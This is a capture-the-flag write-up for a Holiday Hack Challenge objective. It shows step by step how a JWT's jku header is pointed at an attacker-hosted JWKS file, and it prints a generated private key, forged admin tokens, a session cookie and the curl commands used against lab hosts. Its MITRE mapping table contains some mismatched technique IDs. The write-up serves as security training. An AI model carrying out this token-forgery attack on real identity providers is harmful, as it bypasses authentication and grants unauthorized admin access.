---
layout: default
title: act2_rogue_gnome_identity_provider_mjd
nav: |
  <table>
  <thead>
  <tr>
  <th><a href="/HHC_2025/act2_dosis_network_down_mjd.html">Previous Objective: Act2 Dosis Network Down</a></th>
  <th><a href="/HHC_2025/index.html">Home Page</a></th>
  <th><a href="/HHC_2025/act2_quantgnome_leap_mjd.html">Next Objective: Act2 Quantgnome Leap</a></th>
  </tr>
  </thead>
  <tbody>
  </tbody>
  </table>
---
<table>
<thead>
<tr>
<th>Objective: Rogue Gnome Identity Provider</th>
<th>Difficulty Level: 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?</td>
<td>Location: Dosis Neighborhood Park</td>
</tr>
</tbody>
</table>

<h2>Solution Overview</h2>

The attack begins by using exposed gnome credentials (gnome:SittingOnAShelf) to authenticate against the Identity Provider (IDP). This login returns a JSON Web Token (JWT), which is then analyzed. By exploiting weaknesses in JWT validation, the attacker modifies critical claims: changing the subject (sub) from gnome to santa, flipping the admin flag from false to true, and redirecting the jku field to a malicious JWKS file hosted on their own server.

To support the attack, the attacker generates a fraudulent RSA key pair and publishes the public key in their rogue JWKS file, while signing the tampered token with the private key. The manipulated token is then passed to the target service, which incorrectly validates it against the attacker-controlled JWKS endpoint. This grants unauthorized access and a valid session cookie. Finally, the attacker uses the session to connect to the diagnostic interface, retrieving sensitive data - in this case, the file refrigeration-botnet.bin.

<table>
<thead>
<tr>
<th>Activity</th>
<th>Primary Tactic</th>
<th>MITRE ATT&CK Technique ID</th>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collecting exposed gnome credentials</td>
<td>Credential Access</td>
<td>T1552.001</td>
<td>Unsecured Credentials: Passwords</td>
</tr>
<tr>
<td>Authenticating to IDP and analyzing JWT</td>
<td>Defense Evasion</td>
<td>T1140</td>
<td>Deobfuscate/Decode Files or Information</td>
</tr>
<tr>
<td>Modifying JWT claims (<code>sub</code>, <code>admin</code>, <code>jku</code>)</td>
<td>Defense Evasion</td>
<td>T1600</td>
<td>Modify Authentication Process</td>
</tr>
<tr>
<td>Introducing fraudulent JWKS/public key</td>
<td>Defense Evasion</td>
<td>T1550.003</td>
<td>Use Alternate Authentication Material</td>
</tr>
<tr>
<td>Passing tampered token for access</td>
<td>Persistence/Lateral Movement</td>
<td>T1078.004</td>
<td>Valid Accounts: SSH/Other</td>
</tr>
<tr>
<td>Using session cookie to access diagnostics</td>
<td>Impact</td>
<td>T1499</td>
<td>Endpoint Denial/Manipulation</td>
</tr>
</tbody>
</table>

<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>
<br>
URL:

http://paulweb.neighborhood/

Useful resources for understading how JSON Web Tokens work:

https://github.com/ticarpi/jwt_tool/wiki

https://portswigger.net/web-security/jwt

The notes.txt file contains some useful commands and a set of credentials:
<br>
<pre><code class="language-">
<h1>Credentials</h1>

<h2>Gnome credentials (found on a post-it):</h2>
Gnome:SittingOnAShelf

<h1>Curl Commands Used in Analysis of Gnome:</h1>

<h2>Gnome Diagnostic Interface authentication required page:</h2>
curl http://gnome-48371.atnascorp

<h2>Request IDP Login Page</h2>
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

<h2>Authenticate to IDP</h2>
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

<h2>Pass Auth Token to Gnome</h2>
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

<h2>Access Gnome Diagnostic Interface</h2>
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

<h2>Analyze the JWT</h2>
jwt_tool.py <insert-JWT>
</code></pre>

Using the authenticate curl command from the notes combined with the credentials to login:

<pre><code class="language-">
paul@paulweb:~$ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/loginp/login
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg">http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg</a>. If not, click the link.
</code></pre>
<br>
The response includes a token:
<br>
<pre><code class="language-">
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2Mjc4ODkxNCwiZXhwIjoxNzYyNzk2MTE0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.tUTjpDOvj1Yt0gRiLRT9LbD-L1cXfO2vrE0V0OzsV7zJi9THXE91feKN8KarI4Zf0MFgqFWc2I__dUbdpZpURBUaWW1HtLyNkwtzXGrAJuP0n7GM2ZnoK-EKTba1D9TBMOt4gyV_2jaA4QQcU32Oox9m-_GevjGJfL5PMpX1cAqLKQ_TfDxWiLyRYYKKjduEjIKYzC7pHLz_YGcYmmD855FW3FUA8AXJLn3XATnKgvqvHok_kE4HIWNWBvaXLmAD0lOWRloOhIptAMWnbTFAI7Y9YGCP0YMjZ4QUP2DTsgM7cYLSxwGAdWaTZpPm0ZUezw-ssT8wwMeF331SyGjwKg
</code></pre>

Using JWT.IO to decode the token:

!<img src="/HHC_2025/images/roguegnomeidp_jwt.jpg" alt="Decoding the token">

Lets look at the contents of the jwks.json file:
<br>
<pre><code class="language-">
</html>paul@paulweb:~$ curl -v http://idp.atnascorp/.well-known/jwks.json
<ul>
<li>Host idp.atnascorp:80 was resolved.</li>
<li>IPv6: (none)</li>
<li>IPv4: 127.0.0.1</li>
<li>Trying 127.0.0.1:80...</li>
<li>Connected to idp.atnascorp (127.0.0.1) port 80</li>
</ul>
> GET /.well-known/jwks.json HTTP/1.1
> Host: idp.atnascorp
> User-Agent: curl/8.5.0
> Accept: <em>/</em>
>
< HTTP/1.1 200 OK
< Date: Mon, 10 Nov 2025 16:40:39 GMT
< Server: Werkzeug/3.0.1 Python/3.12.3
< Content-Type: application/json
< Content-Length: 476
<
{
  "keys": [
    {
      "e": "AQAB",
      "kid": "idp-key-2025",
      "kty": "RSA",
      "n": "7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ",
      "use": "sig"
    }
  ]
}
</code></pre>

The /etc/passwd file is accessible. The username "santa" looks like a good one to use in the attack.

!<img src="/HHC_2025/images/roguegnomeidp_passwdfile.jpg" alt="Contents of the Password file">

Using mkjwk - JSON Web Key Generator, generate the json web key:

!<img src="/HHC_2025/images/roguegnomeidp_keys.jpg" alt="Generating JSON Web Key">

<pre><code class="language-">
e: AQAB
n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w

{
    "kty": "RSA",
    "e": "AQAB",
    "use": "sig",
    "kid": “idp-key-2025",
    "alg": "RS256",
    "n": "hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w"
}
</code></pre>
<br>
Create the PEM file from the JSON Web Key using jwk to pem convertor (https://8gwifi.org/jwkconvertfunctions.jsp)

<pre><code class="language-">
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAhJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP/GlUHYpNZO
Qv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR/CZBeEQkheALPCd6jNfPjqX7i
c+PYB5VMXiV86QK6dxw9ecJUkKa5Ub/mK/KdCX03o0r+lZxsqxL/19Rv2eF8BEzW
xClm/HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB+ml3jkC
JfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sF
FmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3/wIDAQABAoIBAEtLOJmQ6GOTJpq/
FtRyhmba7MO/JNTaWIXutSigecWnlHXLhLY+sJhc8sQ+vD08O402c75Df7j6U9Pf
iTRFFkWeEK+CfBaaI5m7poiJFAx/RSWo+LUqii+MEsdl6611siANNc6bi15ye8ix
9+O+JnIL2fpqi3CxV3YvHHsUkMmZjwFaxWbVjCmmWj2dZs61hWAqcuiFPPJN0qOz
aH94R5xUVbgQ5lE2xUXaXAitYtTIU36W5DOGuAzoJhZr88QwPsTIOuejJgeAebQc
KjaPGPIggQLZ8X41vISIKLk4XAcM3ZdfBShOJp6Lf3uF9/RrnHLGBlk+NLHwKEjb
GfqkJ9kCgYEAxjitJLJOCCz8qtfz4IiX8Xx4XNzs+XJWHSh5b5ZzxP4VHow/HLWA
s4yKoUMYyrqJZRBz0hKVfelZMYn7JZ9cB821MukKrp+NXyjMPArjIJLWsLQ9MJqg
ZNAtiWCfKoZtWJ1wIqzYHtpgmRfnFeMXlifFh3OULvz/eVuhd/i/IWUCgYEAq0Nh
Sqgy9KYJRUlIWx8Q+aXe5X73bEwAjivcLJ9SaLe1oAPq0gaAMo33qz6vrdqKCBTT
8HTa0jmvgG9UPivJD9llblAu9umbK0NBhIC16c0HD6BeCqXPIgMzt2LKK9vCdrnr
06VwgDhdNBrr1afeBZq0KdvcIa48vo90y+t7b5MCgYEAu95Hq/oanwEUUE/w4qRT
bhsMcOcq6pkFKQmNXsd33gL6vUMrJeiYnJPdaE4Rl0MIqXLYcwgOC5I4aQ1frR7G
uNasoB3jc/HgqYofV+Dxt5O0SzHotMI4tpPgNM4QzNsvk8dT2ml7RHKxDyhqaoIb
fsMfIevXTFmZQMop1W06qUkCgYBUVYnDSbBN6LUH+V44AMRLKvLn7+3G1mYvnEl/
b7UU++HkOgmYArt+KYqcOPIpmkP+VsNG1UQr4Vwa0reZJdaMh3D7MWDvFXnjg+rv
ZLIvv1aKy12DwMKO7SS6WVtU3ZKVBFisj/smKJs83UTkoRUjjVrKggmUTEh9Tgcl
o3/VIQKBgHX31e9bbXhE9djtorJYbtooc9zuP0ORKFGJWTSCoj6Y/HxetewZHV2S
+bWGuBTkTb4b9jHhUOcyBJpuuWtfnFg+db7mTnez1wsQffcde5BHcn8KUSbGrnIR
9UjGRQC4CNPXlEmAQ9PA9l06g/J4iJx6NYCGhW0GaxxUiE9mqRN3
-----END RSA PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAhJwH0hvuZC3HVpQocwmk
76t8wQQOXWETMHnRuP/GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg
9kR/CZBeEQkheALPCd6jNfPjqX7ic+PYB5VMXiV86QK6dxw9ecJUkKa5Ub/mK/Kd
CX03o0r+lZxsqxL/19Rv2eF8BEzWxClm/HFEaaJ3006MKjB6m2gM4eCezhywZOtJ
w0aZhpImD8VroPhMZ24OB+ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2G
dwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3
/wIDAQAB
-----END PUBLIC KEY-----
</code></pre>
<br>
Using JWT.io change the minimal number of items. The hint says gnome has insufficient permission, so we must change sub, admin and jku.

<ul>
<li>sub changes from "gnome" to "santa"</li>
</ul>

<ul>
<li>admin changes from "false" to "true"</li>
</ul>

<ul>
<li>jku changes from "http://idp.atnascorp/.well-known/jwks.json" to "http:/paulweb.neighborhood/jwks.json"</li>
</ul>

The token is signed using the Private key generated. The public key and the fraudulent JWKS file is placed in the www directory of paulweb.neighborhood.

!<img src="/HHC_2025/images/roguegnomeidp_tamperedjwt.jpg" alt="Creating a Tampered Token">

Tampered token:
<br>
<pre><code class="language-">
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
</code></pre>
<br>
Now the tampered token is passed to gnome for a valid session key:
<br>
<pre><code class="language-">
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
</code></pre>
<br>
The session key is used to connect to the diagntic interface:
<br>
<pre><code class="language-">
curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA20V3TpQ5ST2sky_K3XDsllPSs; ' http://gnome-48371.atnascorp/diagnostic-interface
</code></pre>
<br>
!<img src="/HHC_2025/images/roguegnomeidp_diagnostic.jpg" alt="Getting the Diagnostic Interface">

<strong>Answer:refrigeration-botnet.bin</strong>

</details>

<h2>Tools Reference</h2>

<table>
<thead>
<tr>
<th>Tools Used</th>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>curl</td>
<td>8.11.0</td>
</tr>
<tr>
<td><img src="https://JWT.IO" alt="JSON Web Token (JWT) Debugger"></td>
<td>N/A</td>
</tr>
<tr>
<td><img src="https://8gwifi.org/jwkconvertfunctions.jsp" alt="JWK to PEM Converter"></td>
<td>N/A</td>
</tr>
<tr>
<td><img src="https://mkjwk.org/" alt="JSON Web Key generator"></td>
<td>N/A</td>
</tr>
</tbody>
</table>

<h2>Hints Reference</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<td>If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/ . The files for the site are stored in ~/www</td>
</tr>
<tr>
<td>Santa</td>
<td>https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.</td>
</tr>
<tr>
<td>Santa</td>
<td>It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.</td>
</tr>
<tr>
<td>Paul</td>
<td>As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here. I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account. The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on. Ready to help me find a way to bump up our access level, yeah?</td>
</tr>
</tbody>
</table>

<h2>Acknowledgements</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>eucrates</td>
<td>suggested using the jwk to pem convertor website (https://8gwifi.org/jwkconvertfunctions.jsp)</td>
</tr>
</tbody>
</table>

